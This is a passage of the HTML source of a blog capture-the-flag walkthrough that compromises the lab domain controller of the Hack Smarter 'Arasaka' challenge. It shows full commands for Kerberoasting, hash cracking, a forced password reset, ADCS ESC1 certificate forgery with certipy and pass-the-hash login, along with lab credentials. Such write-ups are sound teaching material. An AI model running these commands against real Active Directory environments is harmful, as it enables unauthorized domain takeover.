+</span></span><span class="line"><span class="cl"><span class="p">|</span> SHA-1: 97ac:c4b4:fb84:3417:e8fb:e9b1:a5ae:4357:bb1f:12e9
+</span></span><span class="line"><span class="cl"><span class="p">|</span> -----BEGIN CERTIFICATE-----
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MIIC8DCCAdigAwIBAgIQN1NTSOO69Y5K973diAX2ITANBgkqhkiG9w0BAQsFADAh
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MR8wHQYDVQQDExZEQzAxLmhhY2tzbWFydGVyLmxvY2FsMB4XDTI1MDkyMDAyNTE0
+</span></span><span class="line"><span class="cl"><span class="p">|</span> NloXDTI2MDMyMjAyNTE0NlowITEfMB0GA1UEAxMWREMwMS5oYWNrc21hcnRlci5s
+</span></span><span class="line"><span class="cl"><span class="p">|</span> b2NhbDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALcO/no+r6u9RWZv
+</span></span><span class="line"><span class="cl"><span class="p">|</span> dKtmcvdUyPHST3C9uBPDm7vtdNuWXpWe4TGtDH2uFGq+m3aCy4qWrp74RkGSaYml
+</span></span><span class="line"><span class="cl"><span class="p">|</span> 03IgqSBgo4EK+636edSS8yavRyJINTtJBRstbWh45U7Li00KRdng2TQG5tWBq97r
+</span></span><span class="line"><span class="cl"><span class="p">|</span> lMnN2gMSJsOX1UgaDnf09pcsQn/6cDzHeWkPf64BjOYd2jHxul+0HWU03i4KLtNo
+</span></span><span class="line"><span class="cl"><span class="p">|</span> gpVENdAPxMKqPIQzZjKdoXu9zrhHRo6ayA3FBtF/UlOJp9ul+bMcv4V3morc4Kwi
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Yyg1e4NBIikUteIxYjfVXZHdZnJr16Oe0U1QxR5fwZbhAX9fJ44ORxIzItcjQmJZ
+</span></span><span class="line"><span class="cl"><span class="p">|</span> yyV89VkCAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQw
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MA0GCSqGSIb3DQEBCwUAA4IBAQCLf577kCMAmhyYLnbPBku9hgjRnaifcXM9Ydg9
+</span></span><span class="line"><span class="cl"><span class="p">|</span> 4bdopKAMMmH0fo4Ot0Ito0J91151Ikdv42gQM7UM2nGuwSFFXvnDDuTqiRPC70e3
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Qrnxd4A2mEemsNGdpceiJQ2jZCeX6Qn7SZD0kV/aSXP2olGBzUTUqghlWN8wAnQb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> TgSe7Fti2zQtqKvXfDAgqgKCoeKi38uAnWk3Yt7u600baJAv+mbk/VOkyB80L6tD
+</span></span><span class="line"><span class="cl"><span class="p">|</span> uAooN8gmXwZxxqZCYFR2veZXQ4mihPz+9Tt1ynfO+tepGe2UsYKQLaAcaFLlG5NX
+</span></span><span class="line"><span class="cl"><span class="p">|</span> lcqR+mD8m6CUR+UPFsBDYH1hHOHyRq51fk42yK8VFP7lC/Lz
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_-----END CERTIFICATE-----
+</span></span><span class="line"><span class="cl">60236/tcp filtered unknown       no-response
+</span></span><span class="line"><span class="cl">Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   3:1:1:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled and required
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: mean: -2s, deviation: 0s, median: -2s
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_smb2-time: Protocol negotiation failed <span class="o">(</span>SMB2<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> p2p-conficker:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Checking <span class="k">for</span> Conficker.C or higher...
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Check <span class="m">1</span> <span class="o">(</span>port 34011/tcp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Check <span class="m">2</span> <span class="o">(</span>port 53964/tcp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Check <span class="m">3</span> <span class="o">(</span>port 57551/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Check <span class="m">4</span> <span class="o">(</span>port 48474/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  0/4 checks are positive: Host is CLEAN or ports are blocked
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">NSE: Script Post-scanning.
+</span></span><span class="line"><span class="cl">NSE: Starting runlevel <span class="m">1</span> <span class="o">(</span>of 3<span class="o">)</span> scan.
+</span></span><span class="line"><span class="cl">Initiating NSE at 21:22
+</span></span><span class="line"><span class="cl">Completed NSE at 21:22, 0.00s elapsed
+</span></span><span class="line"><span class="cl">NSE: Starting runlevel <span class="m">2</span> <span class="o">(</span>of 3<span class="o">)</span> scan.
+</span></span><span class="line"><span class="cl">Initiating NSE at 21:22
+</span></span><span class="line"><span class="cl">Completed NSE at 21:22, 0.00s elapsed
+</span></span><span class="line"><span class="cl">NSE: Starting runlevel <span class="m">3</span> <span class="o">(</span>of 3<span class="o">)</span> scan.
+</span></span><span class="line"><span class="cl">Initiating NSE at 21:22
+</span></span><span class="line"><span class="cl">Completed NSE at 21:22, 0.00s elapsed
+</span></span><span class="line"><span class="cl">Read data files from: /usr/share/nmap
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 72.69 seconds
+</span></span><span class="line"><span class="cl">           Raw packets sent: <span class="m">15</span> <span class="o">(</span>660B<span class="o">)</span> <span class="p">|</span> Rcvd: <span class="m">5</span> <span class="o">(</span>220B<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We add the domain and FQDN to <code>/etc/hosts</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;&lt;your-box-ip&gt; DC01.hacksmarter.local hacksmarter.local&#39;</span> <span class="p">|</span> sudo tee -a /etc/hosts
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/arasaka/img/1.png"
+	width="1223"
+	height="297"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="411"
+		data-flex-basis="988px"
+	
+></p>
+<p>We&rsquo;re given starting <a class="link" href="https://courses.hacksmarter.org/courses/f618f837-3060-40a3-81cf-31beeaadf37a/take/arasaka-#user-content-scenario"  target="_blank" rel="noopener"
+    >credentials</a>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">faraday:hacksmarter123
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We use <a class="link" href="https://wadcoms.github.io/wadcoms/Impacket-GetUserSPNs/"  target="_blank" rel="noopener"
+    >GetUserSPNs</a> and get the Kerberos service ticket for alt.svc.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">GetUserSPNs.py hacksmarter.local/faraday:<span class="s1">&#39;hacksmarter123&#39;</span> -dc-host DC01.hacksmarter.local  -request
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/arasaka/img/2.png"
+	width="1220"
+	height="475"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="256"
+		data-flex-basis="616px"
+	
+></p>
+<p>We <code>crack the hash using</code> <code>john</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">john alt.svc-hash --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/arasaka/img/3.png"
+	width="1141"
+	height="253"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="450"
+		data-flex-basis="1082px"
+	
+></p>
+<h2 id="foothold">
+    <a href="#foothold" class="header-anchor">#</a>
+    Foothold
+</h2><p>We run <a class="link" href="https://github.com/SySS-Research/Single-User-BloodHound"  target="_blank" rel="noopener"
+    >bloodhound</a> and find that alt.svc has GenericAll on Yorinobu.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">bloodhound-ce-python -d hacksmarter.local -u &#39;alt.svc&#39; -p &#39;babygirl1&#39; -ns &lt;your-box-ip&gt; -c all --zip
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/arasaka/img/4.png"
+	width="1220"
+	height="729"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="167"
+		data-flex-basis="401px"
+	
+></p>
+<p>We change Yorinobu’s password. Then we see that they can log in because they are part of the Remote Management Users group. But, more importantly, they have GenericWrite on Soulkiller.svc.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">net rpc password &#34;YORINOBU&#34; &#34;newP@ssword2025&#34; -U &#34;DOMAIN&#34;/&#34;alt.svc&#34;%&#39;babygirl1&#39; -S &#34;DC01.hacksmarter.local&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/arasaka/img/9.png"
+	width="1468"
+	height="51"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="2878"
+		data-flex-basis="6908px"
+	
+></p>
+<p><img src="/p/arasaka/img/5.png"
+	width="1219"
+	height="740"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="164"
+		data-flex-basis="395px"
+	
+></p>
+<p><img src="/p/arasaka/img/7.png"
+	width="1850"
+	height="911"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="203"
+		data-flex-basis="487px"
+	
+></p>
+<p><img src="/p/arasaka/img/8.png"
+	width="1859"
+	height="1068"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="174"
+		data-flex-basis="417px"
+	
+></p>
+<h2 id="privilege-escalation">
+    <a href="#privilege-escalation" class="header-anchor">#</a>
+    Privilege Escalation
+</h2><p>Soulkiller.svc is part of the Certificate Service DCOM Access group.</p>
+<p><img src="/p/arasaka/img/6.png"
+	width="1218"
+	height="688"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="177"
+		data-flex-basis="424px"
+	
+></p>
+<p>We use <a class="link" href="https://github.com/ShutdownRepo/targetedKerberoast"  target="_blank" rel="noopener"
+    >targetedKerberoast.py</a> to print the hash of Soulkiller.svc, then we crack the hash with john.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python /path/to/targetedKerberoast.py -v -d &#39;hacksmarter.local&#39; -u &#39;YORINOBU&#39; -p &#39;newP@ssword2025&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">john soulkiller.svc-hash --wordlist=/usr/share/wordlists/rockyou.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/arasaka/img/010.png"
+	width="1875"
+	height="940"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="199"
+		data-flex-basis="478px"
+	
+></p>
+<p><img src="/p/arasaka/img/011.png"
+	width="1340"
+	height="265"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="505"
+		data-flex-basis="1213px"
+	
+></p>
+<p>We use certipy to find that the AI_Takeover template is vulnerable to ESC1. With this, we can get the administrator&rsquo;s NTLM hash.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">certipy find -dn hacksmarter.local -dc-host DC01.hacksmarter.local -vulnerable -u &#39;Soulkiller.svc&#39; -p &#39;MYpassword123#&#39; -ns &lt;your-box-ip&gt; -stdout
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/arasaka/img/012.png"
+	width="1831"
+	height="670"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="273"
+		data-flex-basis="655px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Certificate Authorities
+</span></span><span class="line"><span class="cl">  0
+</span></span><span class="line"><span class="cl">    CA Name                             : hacksmarter-DC01-CA
+</span></span><span class="line"><span class="cl">    DNS Name                            : DC01.hacksmarter.local
+</span></span><span class="line"><span class="cl">    Certificate Subject                 : CN=hacksmarter-DC01-CA, DC=hacksmarter, DC=local
+</span></span><span class="line"><span class="cl">    Certificate Serial Number           : 1DBC9F9ECF287FB04FDE66106578611F
+</span></span><span class="line"><span class="cl">    Certificate Validity Start          : 2025-09-21 15:32:14+00:00
+</span></span><span class="line"><span class="cl">    Certificate Validity End            : 2030-09-21 15:42:14+00:00
+</span></span><span class="line"><span class="cl">    Web Enrollment
+</span></span><span class="line"><span class="cl">      HTTP
+</span></span><span class="line"><span class="cl">        Enabled                         : False
+</span></span><span class="line"><span class="cl">      HTTPS
+</span></span><span class="line"><span class="cl">        Enabled                         : False
+</span></span><span class="line"><span class="cl">    User Specified SAN                  : Disabled
+</span></span><span class="line"><span class="cl">    Request Disposition                 : Issue
+</span></span><span class="line"><span class="cl">    Enforce Encryption for Requests     : Enabled
+</span></span><span class="line"><span class="cl">    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+</span></span><span class="line"><span class="cl">    Permissions
+</span></span><span class="line"><span class="cl">      Owner                             : HACKSMARTER.LOCAL\Administrators
+</span></span><span class="line"><span class="cl">      Access Rights
+</span></span><span class="line"><span class="cl">        ManageCa                        : HACKSMARTER.LOCAL\Administrators
+</span></span><span class="line"><span class="cl">                                          HACKSMARTER.LOCAL\Domain Admins
+</span></span><span class="line"><span class="cl">                                          HACKSMARTER.LOCAL\Enterprise Admins
+</span></span><span class="line"><span class="cl">        ManageCertificates              : HACKSMARTER.LOCAL\Administrators
+</span></span><span class="line"><span class="cl">                                          HACKSMARTER.LOCAL\Domain Admins
+</span></span><span class="line"><span class="cl">                                          HACKSMARTER.LOCAL\Enterprise Admins
+</span></span><span class="line"><span class="cl">        Enroll                          : HACKSMARTER.LOCAL\Authenticated Users
+</span></span><span class="line"><span class="cl">Certificate Templates
+</span></span><span class="line"><span class="cl">  0
+</span></span><span class="line"><span class="cl">    Template Name                       : AI_Takeover
+</span></span><span class="line"><span class="cl">    Display Name                        : AI_Takeover
+</span></span><span class="line"><span class="cl">    Certificate Authorities             : hacksmarter-DC01-CA
+</span></span><span class="line"><span class="cl">    Enabled                             : True
+</span></span><span class="line"><span class="cl">    Client Authentication               : True
+</span></span><span class="line"><span class="cl">    Enrollment Agent                    : False
+</span></span><span class="line"><span class="cl">    Any Purpose                         : False
+</span></span><span class="line"><span class="cl">    Enrollee Supplies Subject           : True
+</span></span><span class="line"><span class="cl">    Certificate Name Flag               : EnrolleeSuppliesSubject
+</span></span><span class="line"><span class="cl">    Enrollment Flag                     : IncludeSymmetricAlgorithms
+</span></span><span class="line"><span class="cl">                                          PublishToDs
+</span></span><span class="line"><span class="cl">    Private Key Flag                    : ExportableKey
+</span></span><span class="line"><span class="cl">    Extended Key Usage                  : Client Authentication
+</span></span><span class="line"><span class="cl">                                          Secure Email
+</span></span><span class="line"><span class="cl">                                          Encrypting File System
+</span></span><span class="line"><span class="cl">    Requires Manager Approval           : False
+</span></span><span class="line"><span class="cl">    Requires Key Archival               : False
+</span></span><span class="line"><span class="cl">    Authorized Signatures Required      : 0
+</span></span><span class="line"><span class="cl">    Schema Version                      : 2
+</span></span><span class="line"><span class="cl">    Validity Period                     : 1 year
+</span></span><span class="line"><span class="cl">    Renewal Period                      : 6 weeks
+</span></span><span class="line"><span class="cl">    Minimum RSA Key Length              : 2048
+</span></span><span class="line"><span class="cl">    Template Created                    : 2025-09-21T16:16:36+00:00
+</span></span><span class="line"><span class="cl">    Template Last Modified              : 2025-09-21T16:16:36+00:00
+</span></span><span class="line"><span class="cl">    Permissions
+</span></span><span class="line"><span class="cl">      Enrollment Permissions
+</span></span><span class="line"><span class="cl">        Enrollment Rights               : HACKSMARTER.LOCAL\Soulkiller.svc
+</span></span><span class="line"><span class="cl">                                          HACKSMARTER.LOCAL\Domain Admins
+</span></span><span class="line"><span class="cl">                                          HACKSMARTER.LOCAL\Enterprise Admins
+</span></span><span class="line"><span class="cl">      Object Control Permissions
+</span></span><span class="line"><span class="cl">        Owner                           : HACKSMARTER.LOCAL\Administrator
+</span></span><span class="line"><span class="cl">        Full Control Principals         : HACKSMARTER.LOCAL\Domain Admins
+</span></span><span class="line"><span class="cl">                                          HACKSMARTER.LOCAL\Enterprise Admins
+</span></span><span class="line"><span class="cl">        Write Owner Principals          : HACKSMARTER.LOCAL\Domain Admins
+</span></span><span class="line"><span class="cl">                                          HACKSMARTER.LOCAL\Enterprise Admins
+</span></span><span class="line"><span class="cl">        Write Dacl Principals           : HACKSMARTER.LOCAL\Domain Admins
+</span></span><span class="line"><span class="cl">                                          HACKSMARTER.LOCAL\Enterprise Admins
+</span></span><span class="line"><span class="cl">        Write Property Enroll           : HACKSMARTER.LOCAL\Domain Admins
+</span></span><span class="line"><span class="cl">                                          HACKSMARTER.LOCAL\Enterprise Admins
+</span></span><span class="line"><span class="cl">    [+] User Enrollable Principals      : HACKSMARTER.LOCAL\Soulkiller.svc
+</span></span><span class="line"><span class="cl">    [!] Vulnerabilities
+</span></span><span class="line"><span class="cl">      ESC1                              : Enrollee supplies subject and template allows client authentication.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We visit the <a class="link" href="https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc1-enrollee-supplied-subject-for-client-authentication"  target="_blank" rel="noopener"
+    >certipy wiki</a> and review the ESC1 instructions. We need the administrator&rsquo;s SID, so we grab it with certipy.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">certipy account -u &#39;Soulkiller.svc@hacksmarter.local&#39; -p &#39;MYpassword123#&#39; -dc-ip &#39;&lt;your-box-ip&gt;&#39; -user &#39;administrator&#39; read
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/arasaka/img/013.png"
+	width="1624"
+	height="338"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="480"
+		data-flex-basis="1153px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">certipy req \
+</span></span><span class="line"><span class="cl">    -u &#39;Soulkiller.svc@hacksmarter.local&#39; -p &#39;MYpassword123#&#39; \
+</span></span><span class="line"><span class="cl">    -dc-ip &#39;&lt;your-box-ip&gt;&#39; -target &#39;DC01.hacksmarter.local&#39; \
+</span></span><span class="line"><span class="cl">    -ca &#39;hacksmarter-DC01-CA&#39; -template &#39;AI_Takeover&#39; \
+</span></span><span class="line"><span class="cl">    -upn &#39;administrator@hacksmarter.local&#39; -sid &#39;S-1-5-21-3154413470-3340737026-2748725799-500&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/arasaka/img/014.png"
+	width="1095"
+	height="394"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="277"
+		data-flex-basis="667px"
+	
+></p>
+<p>We get the administrator&rsquo;s NTLM hash, and login to get the flag.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">certipy auth -pfx &#39;administrator.pfx&#39; -dc-ip &#39;&lt;your-box-ip&gt;&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/arasaka/img/015.png"
+	width="1340"
+	height="395"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="339"
+		data-flex-basis="814px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">evil-winrm -u &#39;administrator&#39; -H 4366ec0f86e29be2a4a5e87a1ba922ec -i &lt;your-box-ip&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/arasaka/img/016.png"
+	width="1454"
+	height="601"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="241"
+		data-flex-basis="580px"
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/sharethepainad/">
+        
+        
+            <div class="article-image">
+                <img src="/p/sharethepainad/img/hack-smarter.2f83e1cfce06ec9b18d7cfa9ffca014f_hu_d2911f9a9feded44.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post ShareThePainAD"
+                        
+                        data-hash="md5-L4Phz84G7JsY18&#43;p/8oBTw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">ShareThePainAD</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2024 - 
+        
+        2025 Blue Pho3nix
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.25.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
